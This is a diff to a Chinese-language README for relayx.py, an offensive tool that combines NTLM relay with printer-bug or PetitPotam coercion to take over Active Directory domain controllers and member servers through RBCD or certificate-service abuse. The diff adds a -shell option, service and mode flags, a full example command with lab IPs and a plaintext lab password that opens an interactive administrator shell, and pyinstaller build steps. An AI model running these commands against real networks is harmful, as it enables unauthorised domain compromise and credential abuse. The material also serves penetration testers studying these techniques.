@@ -10,7 +10,7 @@ DCpwn with ntlmrelay
 positional arguments:
   target                [[domain/]username[:password]@]<targetName or address> or LOCAL (if you want to parse local files)
 
-optional arguments:
+options:
   -h, --help            show this help message and exit
   -r CALLBACK_IP, --callback-ip CALLBACK_IP
                         Attacker callback IP
@@ -32,8 +32,7 @@ connection:
   -adcs-ip ip address   IP Address of the ADCS, if unspecified, dc ip will be used
   --ldap                Use ldap.
   -target-ip ip address
-                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot
-                        resolve it
+                        IP Address of the target machine. If omitted it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
 
 attack:
   -m {rbcd,pki,sdcd}, --method {rbcd,pki,sdcd}
@@ -41,8 +40,7 @@ attack:
   -t {printer,efs}, --trigger {printer,efs}
                         Set up trigger method, printer or petitpotam
   --impersonate IMPERSONATE
-                        target username that will be impersonated (thru S4U2Self) for quering the ST. Keep in mind this will only work if the identity provided in this scripts is
-                        allowed for delegation to the SPN specified
+                        target username that will be impersonated (thru S4U2Self) for quering the ST. Keep in mind this will only work if the identity provided in this scripts is allowed for delegation to the SPN specified
   --add-computer [COMPUTERNAME]
                         Attempt to add a new computer account
   -pipe {efsr,lsarpc,samr,netlogon,lsass}
@@ -53,10 +51,14 @@ attack:
   -ssl                  This is useful when AD CS use ssl.
 
 execute:
+  -shell                Launch semi-interactive shell, Default is False
   -share SHARE          share where the output will be grabbed from (default ADMIN$)
   -shell-type {cmd,powershell}
                         choose a command processor for the semi-interactive shell
   -codec CODEC          Sets encoding used (codec) from the target's output (default "GBK").
+  -service-name service_name
+                        The name of theservice used to trigger the payload
+  -mode {SHARE,SERVER}  mode to use (default SHARE, SERVER needs root!)
 ```
 ## 认证触发
 工具中包含了两种触发机器回连的操作。
@@ -100,12 +102,12 @@ aclpwn -r aclpwn-xxxxx-xxxxx.restore
 ### 二、攻击域成员机器
 攻击普通服务器会自动使用RBCD（基于资源的约束委派）来攻击，所以这里需要域级别>= Server2012R2。
 ```
-python relayx.py cgdomain.com/sanfeng:'1qaz@WSX'@10.211.55.202 -r 10.211.55.2 -dc-ip 10.211.55.203
+python relayx.py cgdomain.com/sanfeng:'1qaz@WSX'@10.211.55.202 -r 10.211.55.2 -dc-ip 10.211.55.203 -shell
 ```
 
 ![](https://blogpics-1251691280.file.myqcloud.com/imgs/20210728172026.png)
 
-攻击成功后，会自动获取一个交互式shell，并会生成一个ccache文件供以后使用，这里默认会模拟`administrator`的身份，如果不存在administrator，可通过`--impersonate` 来指定目标用户。
+攻击成功后，会自动获取一个交互式shell，并会生成一个ccache文件供以后使用，这里默认会模拟`administrator`的身份，如果不存在administrator，可通过`--impersonate` 来指定目标用户,如果未添加`-shell`参数，只保存请求到的票据。
 
 >这里默认会添加一个新的计算机账号，可通过--add-computer 来指定机器名，不指定则为随机名。
 
@@ -131,3 +133,9 @@ python relayx.py cgdomain.com/sanfeng:'1qaz@WSX'@10.211.55.202 -r 10.211.55.2 -d
 >本地没2016环境。所以会报个错。
 
 后续可通过Rubues进行后续攻击。
+
+## 编译
+可以使用以下命令进行编译
+```
+pyinstaller -F -c relayx.py --collect-all impacket --add-data 'comm/ntlmrelayx/attacks/*:comm/ntlmrelayx/attacks'
+```
